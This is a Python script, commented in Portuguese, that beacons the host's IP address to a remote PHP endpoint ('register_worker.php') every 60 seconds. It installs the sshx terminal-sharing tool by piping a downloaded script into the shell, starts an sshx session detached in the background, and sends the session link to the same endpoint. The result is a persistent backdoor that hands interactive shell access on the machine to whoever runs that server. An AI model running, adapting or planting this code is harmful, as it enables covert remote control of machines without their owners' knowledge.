#!/usr/bin/env python3
"""
Announcer: envia o IP do host para a API remota via GET a cada 60 segundos.

Antes de cada announce garante que o `sshx` esteja instalado e executando.
Se necessário instala com `curl -sSf https://sshx.io/get | sh`, inicia um servidor
sshx em background e captura a URL da sessão. A URL é enviada junto ao parâmetro
GET `ssh` em cada announce.

Guarda estado em arquivo temporário para reusar sessão entre reinícios enquanto
o PID indicado estiver vivo.
"""

import time
import urllib.parse
import urllib.request
import socket
import sys
import signal
import subprocess
import shutil
import os
import json
import tempfile
import re


def _clean_ansi_and_control(s: str) -> str:
	# remove sequências ANSI e caracteres de controle não imprimíveis
	try:
		# remove ANSI CSI sequences like '\x1b[0m' etc.
		s = re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', s)
		# remove other non-printable characters
		s = ''.join(ch for ch in s if ch.isprintable())
		return s.strip()
	except Exception:
		return s


STATE_FILE = os.path.join(tempfile.gettempdir(), 'sshx_announcer_state.json')
SSHX_LOG = os.path.join(tempfile.gettempdir(), 'sshx_announce.log')


def get_host_ip():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		# Não envia pacotes; apenas força o SO a escolher uma interface
		s.connect(('8.8.8.8', 80))
		ip = s.getsockname()[0]
	except Exception:
		ip = '127.0.0.1'
	finally:
		s.close()
	return ip


def is_pid_alive(pid):
	try:
		os.kill(pid, 0)
	except OSError:
		return False
	return True


def read_state():
	try:
		with open(STATE_FILE, 'r') as f:
			return json.load(f)
	except Exception:
		return {}


def write_state(state):
	try:
		with open(STATE_FILE, 'w') as f:
			json.dump(state, f)
	except Exception:
		pass


def install_sshx():
	# tenta instalar via script oficial
	print('Instalando sshx via curl...')
	try:
		subprocess.run('curl -sSf https://sshx.io/get | sh', shell=True, check=True, executable='/bin/bash')
		return True
	except subprocess.CalledProcessError as e:
		print('Falha ao instalar sshx:', e)
		return False


def start_sshx_detached(timeout=15):
	# Inicia sshx em background usando nohup e coleta PID
	cmd = f"nohup sshx > {SSHX_LOG} 2>&1 & echo $!"
	try:
		out = subprocess.check_output(cmd, shell=True, executable='/bin/bash', stderr=subprocess.STDOUT)
		pid = int(out.decode().strip())
	except Exception as e:
		print('Erro ao iniciar sshx (detached):', e)
		return None, None

	# esperar o log para obter a linha com Link:
	deadline = time.time() + timeout
	link = None
	pattern = re.compile(r'https?://\S+')
	while time.time() < deadline:
		try:
			if os.path.exists(SSHX_LOG):
				with open(SSHX_LOG, 'r', errors='ignore') as lf:
					for line in lf.readlines()[::-1]:
						if 'Link:' in line:
							m = pattern.search(line)
							if m:
								link = _clean_ansi_and_control(m.group(0))
								break
			if link:
				break
		except Exception:
			pass
		time.sleep(0.3)

	return pid, link


def ensure_sshx():
	# Verifica estado salvo
	state = read_state()
	pid = state.get('pid')
	link = state.get('link')

	if pid and link and is_pid_alive(pid):
		return link

	# tenta detectar se sshx está instalado
	if shutil.which('sshx') is None:
		ok = install_sshx()
		if not ok:
			return None

	# se chegamos aqui, sshx está (ou deve estar) instalado
	# iniciar um servidor sshx em background (detached) e capturar a URL
	pid, link = start_sshx_detached(timeout=20)
	if pid is None:
		return None

	# salvar estado
	write_state({'pid': pid, 'link': link, 'started_at': int(time.time())})
	return link


def announce(url, ip, ssh_link=None, timeout=10):
	params = {'ip': ip}
	if ssh_link:
		params['ssh'] = ssh_link
	qs = urllib.parse.urlencode(params)
	full = f"{url}?{qs}"
	req = urllib.request.Request(full, headers={'User-Agent': 'infinitykkjserver/1.9.5'})
	with urllib.request.urlopen(req, timeout=timeout) as resp:
		return resp.read().decode('utf-8', errors='replace')


def main():
	raw_url = r"http://infinitykkj.shop\auth\svrgoat/apis/register_worker.php"
	url = raw_url.replace('\\', '/')

	print(f"Anunciador iniciado -> {url}")

	def _shutdown(signum, frame):
		print('Recebido sinal de encerramento, saindo...')
		sys.exit(0)

	signal.signal(signal.SIGINT, _shutdown)
	signal.signal(signal.SIGTERM, _shutdown)

	while True:
		ip = get_host_ip()
		now = time.strftime('%Y-%m-%d %H:%M:%S')

		# garantir sshx e obter link (se possível)
		ssh_link = None
		try:
			ssh_link = ensure_sshx()
		except Exception as e:
			print(f"[{now}] erro ao garantir sshx: {e}")

		try:
			resp = announce(url, ip, ssh_link)
			print(f"[{now}] enviado ip={ip} ssh={ssh_link} -> OK; resposta curta: {resp[:200]}")
		except Exception as e:
			print(f"[{now}] erro ao enviar ip={ip} ssh={ssh_link}: {e}")

		# Espera 60 segundos antes do próximo envio
		time.sleep(60)


if __name__ == '__main__':
	main()

